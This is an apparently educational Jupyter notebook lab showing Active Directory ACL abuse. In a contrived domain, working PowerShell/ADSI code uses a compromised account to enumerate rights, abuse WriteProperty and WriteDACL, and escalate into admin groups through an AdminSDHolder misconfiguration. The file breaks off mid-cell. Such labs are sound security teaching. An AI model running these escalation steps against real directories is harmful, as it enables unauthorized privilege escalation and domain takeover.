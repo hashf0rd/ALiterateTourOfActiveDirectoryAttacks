{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {
    "vscode": {
     "languageId": "powershell"
    }
   },
   "source": [
    "# ACL Overview\n",
    "In the Windows operating system, everything is an object - that is, everything is represented by data structures in memory, that contain members that describe the nature of the data the structure is meant to represent. Obvious things such as files and registry keys are objects, but also more abstract things such as processes and threads are also objects.\n",
    "\n",
    "Active Directory is no different - AD is primarily a database of objects that represent the various identities and relationships in a Windows network. Each object in an AD environment is a user, a group, a computer, a printer, a service account, or even a container for any of these.\n",
    "\n",
    "Again, as in the Windows operating system, Active Directory objects themselves control who has access to them via _Access Control Lists_, or ACLs (specifically the **D**iscretionary **A**ccess **C**ontrol List or DACL), with each Access Control Entry (or ACE) in the ACL specifying an identity and the specific access rights that identity can excise on the object.\n",
    "\n",
    "Access rights are incredibly powerful - the demonstration below is not exhaustive, but it will be become apparent how destructive a misconfiured ACE on the wrong object can be. Notably however, many of the attacks that are enabled by misconfigured access rights are detailed in their own notebooks, making understanding what objects have rights over other objects one of the fundamental tasks in reconaissance, and in understanding numerous other attack paths through an AD environment.  \n",
    "\n",
    "This lab however will focus on an attack path that relies entirely on misconfigured ACLs. While this is a contrived example, it will demonstrate how these attacks paths work, and lay important foundations for other labs. If you skip any lab, do not skip this one.\n",
    "\n",
    "For this lab, we will assume we have access to the account of a user called \"John Dee\" by some initial access technique."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "DC=aclabuse,DC=lab\r\n"
     ]
    }
   ],
   "source": [
    "function Search-Directory {\n",
    "    param (\n",
    "        [String]$filter,\n",
    "        [Switch]$all\n",
    "    )\n",
    "\n",
    "    # we are hardcoding a lot of stuff here including creds, which is... bad\n",
    "    $dirEntry = New-Object System.DirectoryServices.DirectoryEntry(\"LDAP://dc01.aclabuse.lab\", \"aclabuse.lab\\john.dee\", \"johnsPass01\")\n",
    "    $searcher = New-Object System.DirectoryServices.DirectorySearcher($dirEntry)\n",
    "    $searcher.Filter = $filter\n",
    "\n",
    "    # SACL part of security descriptor can only be read by a domain admin, so explicitly request the DACL only\n",
    "    $searcher.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl\n",
    "\n",
    "    try {\n",
    "        if($all) {\n",
    "            $results = $searcher.FindAll()\n",
    "            $results | Foreach-Object { $_ }\n",
    "            $results.Dispose()\n",
    "        } else {\n",
    "            $searcher.FindOne()\n",
    "        }\n",
    "    } finally {\n",
    "        $dirEntry.Dispose()\n",
    "    }\n",
    "}\n",
    "\n",
    "(Search-Directory -Filter \"(ObjectCategory=*)\").Properties['DistinguishedName']"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Looks like the creds work. \n",
    "\n",
    "While this notebook seeks to explain ACL attacks and misuses, some discussion of the code is neccessary. The attack path presented here works by making LDAP calls to the directory service in order to both query the directory and request modifications to data in the directory. We are using the [ADSI interface](https://learn.microsoft.com/en-us/windows/win32/adsi/using-adsi) for these calls.\n",
    "\n",
    "The above function works briefly like this: the .NET type `DirectoryEntry` when constructed binds to an entry in the directory, as the name suggests. The `DirectoryEntry` object being constructed above is binding to the _RootDSE_, which is the Root object of the entire directory. The RootDSE sits on a directory server, so we supply it wih the FQDN of the domain controller (the directory server for this lab). The `DirecotryEntry` object is also constructed [using parameters for an authenticated bind](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.directoryentry.-ctor?view=net-8.0#system-directoryservices-directoryentry-ctor(system-string-system-string-system-string-system-directoryservices-authenticationtypes)), using the credentials of the account we have compromised.\n",
    "\n",
    "We then construct a `DirectorySearcher` object - think of it as a pointer or cursor which we use to traverse the directory and look for objects. We need to add a mask for certain propertes - while the DACL is viewable by all users who can view an object, the SACL is only viewable by domain admins. We add a mask to only return the DACL portion of the object security descriptor, otherwise the security descriptor would be blank (with no DACL either). Finally, we apply an [LDAP filter to the DirectorySearcher]() and either return a single result, or all possible results.\n",
    "\n",
    "Lets examine the account we have creds for in more detail. As you can see below, looks like John is in the group __Office Admins__. Maybe an HR function of some kind? "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "DN: CN=John Dee,OU=EnterpriseUsers,DC=aclabuse,DC=lab\n",
      "Groups:\n",
      "    CN=Office Admins,OU=EnterpriseUsers,DC=aclabuse,DC=lab\n"
     ]
    }
   ],
   "source": [
    "$userSearchResult = Search-Directory -Filter \"(&(objectCategory=user)(samAccountName=john.dee))\"\n",
    "\n",
    "\"DN: $($userSearchResult.Properties.distinguishedname)\"\n",
    "\"Groups:\"\n",
    "foreach ($group in $($userSearchResult.Properties.memberof)) {\n",
    "    \"    $group\"\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Lets examine the properties of the Office Admins group briefly. We set the filter to look for the Office Admins group, retrieve a `SearchResult` object and print the properties of the object, which will have been filled with the properties of the AD object we searched for. The distinction between the `SearchResult` object returned by the `Search-Directory` function and the `DirectoryEntry` object is an important one; one is used to examine search results, while the other is nessecary for modifying data in the directory."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Object Type: SearchResult\n",
      "\n",
      "=== Object Properties ===\n",
      "CN: Office Admins\n",
      "DN: CN=Office Admins,OU=EnterpriseUsers,DC=aclabuse,DC=lab\n",
      "Members: CN=John Dee,OU=EnterpriseUsers,DC=aclabuse,DC=lab\n",
      "SID: 1 5 0 0 0 0 0 5 21 0 0 0 161 186 167 27 246 80 60 61 8 20 127 79 82 4 0 0\n"
     ]
    }
   ],
   "source": [
    "$officeAdminsSearchResult = Search-Directory -Filter \"(&(objectCategory=group)(cn=Office Admins))\"\n",
    "\"Object Type: $($officeAdminsSearchResult.GetType().Name)\"\n",
    "\"`n=== Object Properties ===\"\n",
    "\"CN: $($officeAdminsSearchResult.Properties.cn)\"\n",
    "\"DN: $($officeAdminsSearchResult.Properties.distinguishedname)\"\n",
    "\"Members: $($officeAdminsSearchResult.Properties.member)\"\n",
    "\"SID: $($officeAdminsSearchResult.Properties.objectsid)\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "We can see the members only include the compromisd account, John Dee (this is a contrived lab after all). Notice that the SID of the group is in a binary format however. We need the SID for the next step, so we will construct a `SecurityIdentifier` object out of this binary value, in order to convert it to the more recognisable form."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "S-1-5-21-463977121-1027363062-1333728264-1106\r\n"
     ]
    }
   ],
   "source": [
    "$officeAdminsSID = (New-Object System.Security.Principal.SecurityIdentifier([Byte[]]$officeAdminsSearchResult.Properties.objectsid[0],0))\n",
    "$officeAdminsSID.Value"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now for some actual recon. Lets look at what other groups the Office Admins group has rights to. As before we set the LDAP filter, this time to look for any groups with _admin_ in the name. Then, we iterate through the groups, examining the ACLs for the group as we go and highlighting any ACEs that contain the SID of the Office Admins group. This will give us a list of objects in the domain that members of the Office Admins group have rights to. \n",
    "\n",
    "We will do this multiple times in the lab, so we will wrap this code into a convenience function. If we wanted to scale this or use it outside this lab we would need to refactor it considerably, but it works well enough for this demonstration."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Checking which admin groups S-1-5-21-463977121-1027363062-1333728264-1106 has rights on...\n",
      "\n",
      "Allow -> WriteProperty on 'DevOps Admins'\n"
     ]
    }
   ],
   "source": [
    "function scout-adminACL {\n",
    "    param (\n",
    "        [String]$targetSID\n",
    "    )\n",
    "\n",
    "    Write-Host \"Checking which admin groups $targetSID has rights on...`n\"\n",
    "\n",
    "    # Search for groups with \"admin\" in the common name\n",
    "    $groups = $(Search-Directory -Filter \"(&(objectCategory=group)(cn=*admin*))\" -All) \n",
    "    foreach ($group in $groups) {\n",
    "        \n",
    "        # Get the common name of the group\n",
    "        $groupName = $group.Properties[\"cn\"][0]\n",
    "\n",
    "        # Get the ACL from the binary nTSecurityDescriptor property\n",
    "        $groupSecurityDescriptor = New-Object System.DirectoryServices.ActiveDirectorySecurity\n",
    "        $groupSecurityDescriptor.SetSecurityDescriptorBinaryForm([Byte[]]$group.Properties[\"nTSecurityDescriptor\"][0])\n",
    "        $groupACL = $groupSecurityDescriptor.GetAccessRules($true, $true, [System.Security.Principal.SecurityIdentifier])\n",
    "        \n",
    "        # Iterate through the ACLs of each group, looking for the targetSID\n",
    "        foreach ($ace in $groupACL) {\n",
    "            if ($ace.IdentityReference.CompareTo($targetSID) -eq 0) {\n",
    "                Write-Host \"$($ace.AccessControlType) -> $($ace.ActiveDirectoryRights) on '$groupName'\"\n",
    "            }\n",
    "        }\n",
    "    }\n",
    "}\n",
    "\n",
    "scout-adminACL -targetSID $officeAdminsSID.Value\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Bingo. But what can we do with this right?"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## WriteProperty\n",
    "This right, as the name implies, grants a principal the capability to modify properties on another object. If we had `WriteProperty` on the _Domain Admins_ group, for example, we could simply modify the _members_ property and add ourselves to that group. Not so lucky this time, but we do have this right over the _DevOps Admins_ group. We will use this to add our compromised user to the _DevOps Admins_ group.\n",
    "\n",
    "Using the `AdPath` of the group object, we re-bind to the directory at the point of the group object entry itself - we will need the `DirectoryEntry` of the group to actually make changes to the object as it exists in the directory.\n",
    "\n",
    "Once we have the directory entry, we call the `.Add()` method to add our compromised user to the group - this method automatically commits this change back to the directory."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Group Name: DevOps Admins\n",
      "Original Members:\n",
      "    CN=John Dee,OU=EnterpriseUsers,DC=aclabuse,DC=lab\n",
      "\u001b[31;1mMethodInvocationException: \u001b[0m\n",
      "\u001b[31;1m\u001b[36;1mLine |\u001b[0m\n",
      "\u001b[31;1m\u001b[36;1m\u001b[36;1m  12 | \u001b[0m     \u001b[36;1m$devopsAdminsEntry.Add(\"LDAP://CN=John Dee,OU=EnterpriseUsers,DC=\u001b[0m …\u001b[0m\n",
      "\u001b[31;1m\u001b[36;1m\u001b[36;1m\u001b[0m\u001b[36;1m\u001b[0m\u001b[36;1m     | \u001b[31;1m     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\u001b[0m\n",
      "\u001b[31;1m\u001b[36;1m\u001b[36;1m\u001b[0m\u001b[36;1m\u001b[0m\u001b[36;1m\u001b[31;1m\u001b[31;1m\u001b[36;1m     | \u001b[31;1mException calling \"Add\" with \"1\" argument(s): \"The object already exists. (0x80071392)\"\u001b[0m\n",
      "\n",
      "New Members:\n",
      "    CN=John Dee,OU=EnterpriseUsers,DC=aclabuse,DC=lab\n"
     ]
    },
    {
     "ename": "Error",
     "evalue": "Exception calling \"Add\" with \"1\" argument(s): \"The object already exists. (0x80071392)\"",
     "output_type": "error",
     "traceback": [
      "Exception calling \"Add\" with \"1\" argument(s): \"The object already exists. (0x80071392)\""
     ]
    }
   ],
   "source": [
    "$devOpsAdminsSearchResult = Search-Directory -Filter \"(&(objectCategory=group)(cn=DevOps Admins))\"\n",
    "\n",
    "\"Group Name: $($devopsAdminsSearchResult.Properties.name)\"\n",
    "\"Original Members:\"\n",
    "foreach ($member in $($devopsAdminsSearchResult.Properties.member)){\n",
    "    \"    $member\"\n",
    "}\n",
    "\n",
    "try {\n",
    "    $AdPath = $devopsAdminsSearchResult.Path\n",
    "    $devOpsAdminsEntry = New-Object System.DirectoryServices.DirectoryEntry($AdPath, \"aclabuse.lab\\john.dee\", \"johnsPass01\")\n",
    "    $devopsAdminsEntry.Add(\"LDAP://CN=John Dee,OU=EnterpriseUsers,DC=aclabuse,DC=lab\")\n",
    "} finally {\n",
    "    $devopsAdminsEntry.Dispose()\n",
    "}\n",
    "\n",
    "$devOpsAdminsSearchResult = Search-Directory -Filter \"(&(objectCategory=group)(cn=DevOps Admins))\"\n",
    "\"`nNew Members:\"\n",
    "foreach ($member in $($devopsAdminsSearchResult.Properties.member)) {\n",
    "    \"    $member\"\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Examining the compromised account once more we can see the `MemberOf` property has been updated and reflects the new group membership."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "DN: CN=John Dee,OU=EnterpriseUsers,DC=aclabuse,DC=lab\n",
      "Groups:\n",
      "    CN=DevOps Admins,OU=EnterpriseUsers,DC=aclabuse,DC=lab\n",
      "    CN=Office Admins,OU=EnterpriseUsers,DC=aclabuse,DC=lab\n"
     ]
    }
   ],
   "source": [
    "$userSearchResult = Search-Directory -Filter \"(&(objectClass=user)(samAccountName=john.dee))\"\n",
    "\n",
    "\"DN: $($userSearchResult.Properties.distinguishedname)\"\n",
    "\"Groups:\"\n",
    "foreach ($group in $($userSearchResult.Properties.memberof)) {\n",
    "    \"    $group\"\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Tidying Up\n",
    "You will notice in the above code and in nearly all other code cells in this lab that there are calls to the `.Dipose()` method after nearly all operations involving construction of a `DirectoryEntry`. This is because ADSI caches connections unless they are explicitly broken by disposing of the resources it uses, and a `DirectoryEntry` is a direct bind and therefore connection to an object in a directory service.\n",
    "\n",
    "The reasona to explicitly break this connection are twofold; for one, we use the DirectoryEntry constructor to create an _authenticated_ bind using our stolen creds, so that we can begin searching the directory as a normal user rather than an anonymous user. This means any time we want to re-authenticate we need to dispose this initial bind. The second reason, is that after we have achieved privileged esclataion, such as adding our compromised user to select privileged groups, we need to re-authenticate so that our access token associated with the ADSI bind is reconstructed with the newly added privileges. If we did not explicitly break the bind with `.Dispose()`, the connection would persist (you can check this by removing the `.Dipose()` and examing the network traffic) and we would continue to use the older access token which lacks the newly added privileged groups, and subsequent attempts to escalate privileges would fail. There is a potential opsec consideration here - as these repeated authentication attempts will possibly appear abnormal when compared to normal user behaviour. Again, **this notebook is meant to be illustrative not prescriptive** - it is written to demonstrate what _can_ be done, not what _should_ be done. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## WriteDACL\n",
    "Hunting forward we can see that the DevOps Admins group has the right WriteDACL on the IT Admins group. This right is self descriptive - it allows for a principal to modify the DACL of another object."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Checking which admin groups S-1-5-21-463977121-1027363062-1333728264-1108 has rights on...\n",
      "\n",
      "Allow -> ReadControl, WriteDacl on 'IT Admins'\n"
     ]
    }
   ],
   "source": [
    "$devopsAdminsSearchResult = Search-Directory -Filter \"(&(objectCategory=group)(cn=DevOps Admins))\"\n",
    "$devopsAdminsSID = (New-Object System.Security.Principal.SecurityIdentifier([Byte[]]$devopsAdminsSearchResult.Properties.objectsid[0],0))\n",
    "scout-adminACL -targetSID $devopsAdminsSID.value"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Lets use the WriteDACL to add an entry to the DACL on the IT Admins group object, which lets us modify that group. We could add WriteProperty and use this as before to modify group membership, but lets try a more permissive right: GenericWrite.\n",
    "\n",
    "We will first construct an ACE using our compromised users SID, the AD right we want (GenericWrite), the control type of _allow_, and with inheritence disabled. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "\u001b[32;1mActiveDirectoryRights : \u001b[0mGenericWrite\n",
      "\u001b[32;1mInheritanceType       : \u001b[0mNone\n",
      "\u001b[32;1mObjectType            : \u001b[0m00000000-0000-0000-0000-000000000000\n",
      "\u001b[32;1mInheritedObjectType   : \u001b[0m00000000-0000-0000-0000-000000000000\n",
      "\u001b[32;1mObjectFlags           : \u001b[0mNone\n",
      "\u001b[32;1mAccessControlType     : \u001b[0mAllow\n",
      "\u001b[32;1mIdentityReference     : \u001b[0mS-1-5-21-463977121-1027363062-1333728264-1104\n",
      "\u001b[32;1mIsInherited           : \u001b[0mFalse\n",
      "\u001b[32;1mInheritanceFlags      : \u001b[0mNone\n",
      "\u001b[32;1mPropagationFlags      : \u001b[0mNone\n",
      "\n"
     ]
    }
   ],
   "source": [
    "$userSID = (New-Object System.Security.Principal.SecurityIdentifier([Byte[]]$userSearchResult.Properties.objectsid[0],0))\n",
    "$newAce = (New-Object System.DirectoryServices.ActiveDirectoryAccessRule(\n",
    "                ([System.Security.Principal.IdentityReference]([System.Security.Principal.SecurityIdentifier]$userSID)), \n",
    "                ([System.DirectoryServices.ActiveDirectoryRights]'GenericWrite'),\n",
    "                ([System.Security.AccessControl.AccessControlType]'Allow'),\n",
    "                ([System.DirectoryServices.ActiveDirectorySecurityInheritance]'None'))\n",
    "            )\n",
    "$newAce | Select *"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Inheritence can be a useful primitive in ACL attacks, as having control over a parent object and being able to apply an inheritable ACE to that parent implies control over its children.\n",
    "\n",
    "The code below that we use to apply this ACE to the DACL of the IT Admins group is similar to the code that we use to add a principal to the members property, however whereas when adding a principal to the group used the `Add()` method here we explicitly commit changes by calling (you guessed it) `.CommitChanges()`. The only other thing to note is we are still masking the security descriptor to only retrieve or affect the DACL portion - we are still not privileged enough to touch the SACL."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": [
    "$ITAdminsSearchResult = Search-Directory -Filter \"(&(objectCategory=group)(cn=IT Admins))\"\n",
    "\n",
    "try {\n",
    "    $AdPath = \"LDAP://dc01.aclabuse.lab/$($ITAdminsSearchResult.Properties.distinguishedname)\"\n",
    "    $ITAdminsEntry = New-Object System.DirectoryServices.DirectoryEntry($AdPath, \"aclabuse.lab\\john.dee\", \"johnsPass01\")\n",
    "    $ITAdminsEntry.psbase.Options.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl\n",
    "    $ITAdminsEntry.psbase.ObjectSecurity.AddAccessRule($newAce)\n",
    "    $ITAdminsEntry.psbase.CommitChanges()\n",
    "} finally {\n",
    "    $ITAdminsEntry.Dispose()\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "If the above code runs succesfully it will generate no output, so lets check the ACE of the IT Admins group to ensure our ACE has been added."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "\u001b[32;1mActiveDirectoryRights : \u001b[0mGenericWrite\n",
      "\u001b[32;1mInheritanceType       : \u001b[0mNone\n",
      "\u001b[32;1mObjectType            : \u001b[0m00000000-0000-0000-0000-000000000000\n",
      "\u001b[32;1mInheritedObjectType   : \u001b[0m00000000-0000-0000-0000-000000000000\n",
      "\u001b[32;1mObjectFlags           : \u001b[0mNone\n",
      "\u001b[32;1mAccessControlType     : \u001b[0mAllow\n",
      "\u001b[32;1mIdentityReference     : \u001b[0mS-1-5-21-463977121-1027363062-1333728264-1104\n",
      "\u001b[32;1mIsInherited           : \u001b[0mFalse\n",
      "\u001b[32;1mInheritanceFlags      : \u001b[0mNone\n",
      "\u001b[32;1mPropagationFlags      : \u001b[0mNone\n",
      "\n"
     ]
    }
   ],
   "source": [
    "$ITAdminsPath = (Search-Directory -Filter \"(&(objectCategory=group)(cn=IT Admins))\").Path\n",
    "\n",
    "try {\n",
    "    $ITAdminsEntry = New-Object System.DirectoryServices.DirectoryEntry(\n",
    "                        $ITAdminsPath, \n",
    "                        \"aclabuse.lab\\john.dee\", \n",
    "                        \"johnsPass01\"\n",
    "                    )\n",
    "\n",
    "    ForEach ($ACE in $ITAdminsEntry.ObjectSecurity.GetAccessRules($true, $true, [System.Security.Principal.SecurityIdentifier])) {\n",
    "        if ($ACE.IdentityReference.CompareTo($userSID) -eq 0) {\n",
    "            $ACE\n",
    "        }\n",
    "    }\n",
    "} finally {\n",
    "    $ITAdminsEntry.Dispose()\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## GenericWrite"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "source": [
    "The GenericWrite right allows for a great deal of control over an object, and is the equivilent to having both WriteProperty and WritePropetyExtended set with ObjectType GUID set to 0 (meaning, all properties or extended properties). For simplicity sake however, we will leverage it to just add our compromised user to the IT Admins group.\n",
    "\n",
    "Below is the same group modification pattern as you have seen before that will add our compromised user to this group."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Group Name: IT Admins\n",
      "Original Members:\n",
      "\n",
      "Current Members:\n",
      "    CN=John Dee,OU=EnterpriseUsers,DC=aclabuse,DC=lab\n"
     ]
    }
   ],
   "source": [
    "$ITAdminsSearchResult = Search-Directory -Filter \"(&(objectCategory=group)(cn=IT Admins))\"\n",
    "\n",
    "\"Group Name: $($ITAdminsSearchResult.Properties.name)\"\n",
    "\"Original Members:\"\n",
    "foreach ($member in $($ITAdminsSearchResult.Properties.member)){\n",
    "    \"    $member\"\n",
    "}\n",
    "\n",
    "try {\n",
    "    $AdPath = $ITAdminsSearchResult.Path\n",
    "    $ITAdminsEntry = New-Object System.DirectoryServices.DirectoryEntry($AdPath, \"aclabuse.lab\\john.dee\", \"johnsPass01\")\n",
    "    $ITAdminsEntry.Add(\"LDAP://CN=John Dee,OU=EnterpriseUsers,DC=aclabuse,DC=lab\")\n",
    "    $ITAdminsEntry.RefreshCache()\n",
    "} finally {\n",
    "    $ITAdminsEntry.Dispose()\n",
    "}\n",
    "\n",
    "$ITAdminsSearchResult = Search-Directory -Filter \"(&(objectCategory=group)(cn=IT Admins))\"\n",
    "\"`nCurrent Members:\"\n",
    "foreach ($member in $($ITAdminsSearchResult.Properties.member)){\n",
    "    \"    $member\"\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "And as before this should be reflected in the users directory entry."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "DN: CN=John Dee,OU=EnterpriseUsers,DC=aclabuse,DC=lab\n",
      "Groups:\n",
      "    CN=DevOps Admins,OU=EnterpriseUsers,DC=aclabuse,DC=lab\n",
      "    CN=IT Admins,OU=EnterpriseUsers,DC=aclabuse,DC=lab\n",
      "    CN=Office Admins,OU=EnterpriseUsers,DC=aclabuse,DC=lab\n"
     ]
    }
   ],
   "source": [
    "$userSearchResult = Search-Directory -Filter \"(&(objectClass=user)(samAccountName=john.dee))\"\n",
    "\n",
    "\"DN: $($userSearchResult.Properties.distinguishedname)\"\n",
    "\"Groups:\"\n",
    "foreach ($group in $($userSearchResult.Properties.memberof)) {\n",
    "    \"    $group\"\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Lets examine what rights the IT Admins group has and on what objects in the domain."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Checking which admin groups S-1-5-21-463977121-1027363062-1333728264-1107 has rights on...\n",
      "\n",
      "Allow -> GenericAll on 'Administrators'\n",
      "Allow -> GenericAll on 'Schema Admins'\n",
      "Allow -> GenericAll on 'Enterprise Admins'\n",
      "Allow -> GenericAll on 'Domain Admins'\n",
      "Allow -> GenericAll on 'Key Admins'\n",
      "Allow -> GenericAll on 'Enterprise Key Admins'\n"
     ]
    }
   ],
   "source": [
    "$ITAdminsSearchResult = Search-Directory -Filter \"(&(objectCategory=group)(cn=IT Admins))\"\n",
    "$ITAdminsSID = (New-Object System.Security.Principal.SecurityIdentifier([Byte[]]$ITAdminsSearchResult.Properties.objectsid[0],0))\n",
    "scout-adminACL -targetSID $ITAdminsSID.value"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Blimey. Thats bad. Looks like IT Admins has permissions on all privileged groups. So what is granting these rights?\n",
    "\n",
    "## GenericAll and AdminSDHolder\n",
    "GenericAll means just that - any and all actions are permitted on the target object for the principle granted the right. How this right was applied to so many privileged groups is down to a template object known as AdminSDHolder.\n",
    "\n",
    "AdminSDHolder is an object that holds the DACL for all privileged objects in the domain. Every 60 minutes or so, a process called SDProp will run and apply whatever DACL is on AdminSDHolder to the privileged groups, overwriting any other DACL that those objects may have. This is a security control, as any misconfigurations to the DACL of these privileged groups could lead to compromise as we have already seen. This is unfortunately a double edged sword, and if permissions on the AdminSDHolder object are not careful controlled then it instead becomes a pathway for an attacker.\n",
    "\n",
    "As we can see below the IT Admins group was at some point granted GenericAll on the AdminSDHolder object, and has retained this right - meaning it has propagated out to all the privileged groups in the domain.\n",
    "\n",
    "Examinging the ACL of the AdminSDHolder object confirms this - it contains an ACE with the SID of the IT Admins group and with GenericAll allowed."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "\u001b[32;1mActiveDirectoryRights : \u001b[0mGenericAll\n",
      "\u001b[32;1mInheritanceType       : \u001b[0mNone\n",
      "\u001b[32;1mObjectType            : \u001b[0m00000000-0000-0000-0000-000000000000\n",
      "\u001b[32;1mInheritedObjectType   : \u001b[0m00000000-0000-0000-0000-000000000000\n",
      "\u001b[32;1mObjectFlags           : \u001b[0mNone\n",
      "\u001b[32;1mAccessControlType     : \u001b[0mAllow\n",
      "\u001b[32;1mIdentityReference     : \u001b[0mS-1-5-21-463977121-1027363062-1333728264-1107\n",
      "\u001b[32;1mIsInherited           : \u001b[0mFalse\n",
      "\u001b[32;1mInheritanceFlags      : \u001b[0mNone\n",
      "\u001b[32;1mPropagationFlags      : \u001b[0mNone\n",
      "\n"
     ]
    }
   ],
   "source": [
    "$AdminSDPath = (Search-Directory -Filter  \"(cn=AdminSDHolder)\").Path\n",
    "\n",
    "try {\n",
    "    $adminSDEntry = New-Object System.DirectoryServices.DirectoryEntry(\n",
    "                        $AdminSDPath, \n",
    "                        \"aclabuse.lab\\john.dee\", \n",
    "                        \"johnsPass01\"\n",
    "                    )\n",
    "\n",
